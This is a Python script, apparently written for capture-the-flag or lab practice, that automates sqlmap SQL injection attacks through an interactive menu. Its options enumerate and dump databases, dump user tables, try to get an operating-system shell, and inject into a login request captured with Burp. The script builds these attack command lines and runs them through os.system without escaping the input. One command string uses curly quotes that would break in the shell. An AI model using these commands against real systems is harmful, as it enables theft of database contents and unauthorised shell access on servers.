#!/usr/bin/python3
import os

def sqlmap():
	q1	= input("What is the location you would like to scan against?\nExample Syntax	192.168.11.137:8000/?nid=2\n> ")
	while True:
		q2	= input("""
What are you trying to do?
Step 1. Quick General Enumeration	=	1
Step 2.	Try to get a sql SHELL 		=	2 <you need a database name for this to work which you may get from step 1>
Step 3. Try to dump tables		=	3
Step 4. Try to dump users		=	4
Step 5.	Use burp to Brute Force		=	5
> """)
		try:
			q2 = int(q2)
			break
		except TypeError:
			print("That was not a valid input. Go Fuck Yourself and Try Again.")
			return
		except ValueError:
			return
	if q2	== 1:
		command		= 'sqlmap -u "{}" --risk=3 --level=5 --dbs --dump'.format(q1)
	elif q2	== 2:
		q3	=	input("What is the name of the database you would like to make a shell from?\n> ")
		command = 'sqlmap -u “{}” --risk=3 --level=5 --os-shell -D {}'.format(q1, q3)
	elif q2	== 3:
		command = 'sqlmap -u "{}" --risk=3 --level=5 --threads=4 --dbs --tables --batch'.format(q1)
	elif q2	== 4:
		command = 'sqlmap -u "{}" --risk=3 --level=5 --threads=4 --dbs  --batch -T users --dump'.format(q1)
	elif q2	== 5:
		q4	= input("""
This one has a few extra steps, but it's pretty neat.
catch a POST to login page (or whatever) with burp
Send that to repeater, and copy the text out (by highlighting it)
put that text into a .txt file named post.txt
Make sure to note what the sql-injectable element is

What is the sql-injectable element? (uname, pword, username, etc...)\n> """)
		while True:
			q5	= input("What is the full path to the post.txt file? (/root/Desktop/Machines/yee/post.txt)\n> ")
			if os.path.isfile(q5) == True:
				break
			else:
				print("I can't seem to find that file...Try again.")
				continue
		command = 'sqlmap -r {} -p {}'.format(q5, q4)
	else:
		return
	doit(command)
	return
def doit(command):
	os.system("terminator --new-tab -x 'echo \"{}\"; {}; $SHELL'".format(command, command))
	print("{}\n".format(command))
	return

def main():
	while True:
		sqlmap()

main()
